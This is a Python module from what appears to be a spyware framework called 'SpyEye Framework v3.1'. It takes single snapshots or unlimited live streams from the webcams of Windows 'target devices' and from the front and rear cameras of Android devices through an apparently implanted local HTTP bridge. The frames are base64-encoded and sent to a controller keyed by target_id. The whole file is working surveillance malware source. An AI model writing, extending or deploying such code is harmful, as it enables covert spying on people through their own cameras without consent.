"""
modules/camera.py

Professional Remote Camera Capture Module for SpyEye Framework v3.1.
  - Windows: OpenCV (cv2.VideoCapture) for robust webcam streaming & captures.
  - Android: Camera2 / HTTP Bridge integration for front (selfie) & rear capture.
  - Supports continuous live streaming (periodic frames) and single-shot snapshots.
  - Output: base64-encoded JPEG frames emitted safely via SocketIO callbacks.
"""

import base64
import logging
import time
from typing import Any, Dict, Optional

try:
    import cv2
except ImportError:
    cv2 = None

from modules.base import BaseModule

logger = logging.getLogger(__name__)


class CameraModule(BaseModule):
    """
    Captures frames from target devices (Windows webcam or Android front/rear camera).

    Configuration parameters:
        camera_id (int): 0 = rear/back camera or default webcam, 1 = front/selfie camera (default: 0)
        capture_mode (str): "single" (snapshot) | "stream" (live feed) (default: "single")
        interval (float): Seconds between captures in stream mode (default: 3.0)
        max_captures (int): Max frames in stream mode, 0 = unlimited (default: 0)
        resolution (tuple): (width, height) e.g., (1280, 720) (default: (640, 480))
        quality (int): JPEG quality percentage 1-100 (default: 85)
        platform (str): "windows" | "android" (auto-detected if omitted)
    """

    def __init__(self, target_id: str, config: Optional[Dict[str, Any]] = None):
        super().__init__(target_id, config)
        self._camera = None
        self._capture_count = 0
        self._result_callback = None

    def validate_config(self) -> bool:
        """Validate configuration settings provided for the camera module."""
        camera_id = self.config.get("camera_id", 0)
        if not isinstance(camera_id, int) or camera_id < 0:
            logger.error("[%s] camera_id must be a non-negative integer", self._module_name)
            return False
        
        mode = self.config.get("capture_mode", "single")
        if mode not in ["single", "stream"]:
            logger.error("[%s] capture_mode must be 'single' or 'stream'", self._module_name)
            return False

        return True

    def set_result_callback(self, callback) -> None:
        """Inject a callback function to handle real-time frame transmissions."""
        self._result_callback = callback

    def run(self) -> None:
        """Main execution loop running in a dedicated thread."""
        camera_id = self.config.get("camera_id", 0)
        mode = self.config.get("capture_mode", "single")
        interval = float(self.config.get("interval", 3.0))
        max_captures = int(self.config.get("max_captures", 0))
        resolution = tuple(self.config.get("resolution", (640, 480)))
        quality = int(self.config.get("quality", 85))
        platform = self.config.get("platform", "windows")

        logger.info(
            "[%s] Initializing — camera_id=%d, mode=%s, interval=%.1fs, res=%dx%d, platform=%s",
            self._module_name, camera_id, mode, interval, resolution[0], resolution[1], platform
        )

        # Route execution based on target target platform
        if platform == "android":
            self._run_android_loop(camera_id, mode, interval, max_captures, quality)
        else:
            self._run_opencv_loop(camera_id, mode, interval, max_captures, resolution, quality)

    def _run_opencv_loop(
        self,
        camera_id: int,
        mode: str,
        interval: float,
        max_captures: int,
        resolution: tuple,
        quality: int,
    ) -> None:
        """OpenCV-based capture loop for Windows / Desktop environments."""
        if cv2 is None:
            logger.error("[%s] OpenCV (cv2) package is not installed on the system.", self._module_name)
            self._emit_error("OpenCV package missing on target device")
            return

        try:
            # Initialize VideoCapture with DirectShow backend for stability on Windows
            self._camera = cv2.VideoCapture(camera_id, cv2.CAP_DSHOW)
            if not self._camera.isOpened():
                # Fallback to default backend if DSHOW fails
                self._camera = cv2.VideoCapture(camera_id)
                if not self._camera.isOpened():
                    logger.error("[%s] Failed to open camera device index %d", self._module_name, camera_id)
                    self._emit_error(f"Failed to open camera {camera_id}")
                    return

            # Apply target resolution configuration
            self._camera.set(cv2.CAP_PROP_FRAME_WIDTH, resolution[0])
            self._camera.set(cv2.CAP_PROP_FRAME_HEIGHT, resolution[1])

            # Short warm-up delay for auto-focus and exposure adjustment
            time.sleep(0.8)

            if mode == "single":
                self._capture_single_opencv(quality)
            else:
                self._capture_stream_opencv(interval, max_captures, quality)

        except Exception as exc:
            logger.exception("[%s] OpenCV execution exception: %s", self._module_name, exc)
            self._emit_error(f"Camera execution error: {exc}")
        finally:
            self.release_camera()

    def _capture_single_opencv(self, quality: int) -> None:
        """Capture a single frame snapshot (Front/Selfie or Back) and emit."""
        ret, frame = self._camera.read()
        if not ret or frame is None:
            logger.warning("[%s] Failed to read frame from OpenCV capture device.", self._module_name)
            self._emit_error("Failed to capture image frame")
            return

        b64_data = self._frame_to_base64(frame, quality)
        self._emit_frame(b64_data, "single")
        logger.info("[%s] Single snapshot capture complete (%d bytes base64)", self._module_name, len(b64_data))

    def _capture_stream_opencv(self, interval: float, max_captures: int, quality: int) -> None:
        """Continuous live stream loop until stopped or max limit is reached."""
        while not self._should_stop():
            ret, frame = self._camera.read()
            if not ret or frame is None:
                logger.warning("[%s] Live stream frame read failed, retrying...", self._module_name)
                time.sleep(0.5)
                continue

            b64_data = self._frame_to_base64(frame, quality)
            self._emit_frame(b64_data, "stream")
            self._capture_count += 1

            if max_captures > 0 and self._capture_count >= max_captures:
                logger.info("[%s] Stream reached maximum configured captures (%d)", self._module_name, max_captures)
                break

            # Respect interval delay while monitoring stop event signals
            self._stop_event.wait(timeout=interval)

    def _frame_to_base64(self, frame, quality: int) -> str:
        """Encode raw NumPy array frame into a compressed base64 JPEG string."""
        encode_params = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
        ret, buffer = cv2.imencode(".jpg", frame, encode_params)
        if not ret:
            raise RuntimeError("Failed to encode frame matrix to JPEG format")
        return base64.b64encode(buffer.tobytes()).decode("utf-8")

    def _run_android_loop(
        self,
        camera_id: int,
        mode: str,
        interval: float,
        max_captures: int,
        quality: int,
    ) -> None:
        """
        Android execution flow: Interacts with local agent HTTP bridge 
        (e.g., exposing camera2 API for front/rear switching).
        """
        import requests

        bridge_url = "http://127.0.0.1:8088/camera/capture"
        params = {"camera_id": camera_id, "quality": quality}

        def _fetch_android_frame() -> Optional[str]:
            try:
                response = requests.get(bridge_url, params=params, timeout=8)
                if response.status_code == 200:
                    return response.text
                else:
                    logger.warning("[%s] Android local bridge responded with HTTP %d", self._module_name, response.status_code)
                    return None
            except requests.RequestException as exc:
                logger.warning("[%s] Android bridge connection failed: %s", self._module_name, exc)
                return None

        if mode == "single":
            b64 = _fetch_android_frame()
            if b64:
                self._emit_frame(b64, "single")
            else:
                self._emit_error("Android camera bridge failed to return frame")
        else:
            while not self._should_stop():
                b64 = _fetch_android_frame()
                if b64:
                    self._emit_frame(b64, "stream")
                    self._capture_count += 1

                if max_captures > 0 and self._capture_count >= max_captures:
                    break

                self._stop_event.wait(timeout=interval)

    def release_camera(self) -> None:
        """Safely release the hardware camera resources."""
        if self._camera and cv2:
            try:
                self._camera.release()
                logger.debug("[%s] Hardware camera successfully released.", self._module_name)
            except Exception as exc:
                logger.error("[%s] Error releasing camera resource: %s", self._module_name, exc)
            finally:
                self._camera = None

    def _emit_frame(self, b64_data: str, mode: str) -> None:
        """Dispatch captured frame telemetry via callback or logger fallback."""
        payload = {
            "target_id": self.target_id,
            "module": "camera",
            "action": "frame",
            "mode": mode,
            "camera_id": self.config.get("camera_id", 0),
            "frame": b64_data,
            "timestamp": time.time(),
            "capture_number": self._capture_count + 1,
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.info("[%s] Frame emitted successfully (%d bytes)", self._module_name, len(b64_data))

    def _emit_error(self, message: str) -> None:
        """Dispatch error notifications."""
        payload = {
            "target_id": self.target_id,
            "module": "camera",
            "action": "error",
            "message": message,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.error("[%s] Error: %s", self._module_name, message)

    def stop(self, timeout: float = 3.0) -> bool:
        """Clean shutdown of camera module threads and hardware resources."""
        success = super().stop(timeout)
        self.release_camera()
        return success